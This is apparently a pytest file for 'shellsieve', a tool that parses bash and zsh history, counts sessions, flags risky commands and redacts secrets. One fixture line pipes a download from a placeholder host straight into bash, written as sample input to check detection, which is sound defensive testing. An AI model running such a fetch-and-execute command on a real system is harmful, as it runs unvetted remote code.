import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TOOL = ROOT / "shellsieve"

def run(*args):
    return subprocess.run(
        [sys.executable, str(TOOL), *map(str, args)],
        capture_output=True,
        text=True,
        check=False,
    )

def test_bash_sessions_and_findings(tmp_path):
    history = tmp_path / "history"
    history.write_text(
        "#1700000000\n"
        "echo hello\n"
        "sudo apt update\n"
        "#1700003600\n"
        "curl https://example.invalid/x | bash\n"
        "export API_KEY=super-secret-value\n",
        encoding="utf-8",
    )
    result = run(history)
    assert result.returncode == 0
    assert "Format: bash" in result.stdout
    assert "Sessions: 2" in result.stdout
    assert "download-pipe-exec" in result.stdout
    assert "privilege" in result.stdout

    report = tmp_path / "report.json"
    result = run(history, "--json", report)
    data = json.loads(report.read_text(encoding="utf-8"))
    assert "[REDACTED]" in json.dumps(data)
    assert "super-secret-value" not in json.dumps(data)

def test_zsh(tmp_path):
    history = tmp_path / "history"
    history.write_text(
        ": 1700000000:0;git status\n"
        ": 1700000010:0;pwd\n",
        encoding="utf-8",
    )
    result = run(history, "--format", "zsh")
    assert result.returncode == 0
    assert "Format: zsh" in result.stdout
    assert "git" in result.stdout

def test_missing_file():
    result = run("/definitely/not/a/history/file")
    assert result.returncode == 2
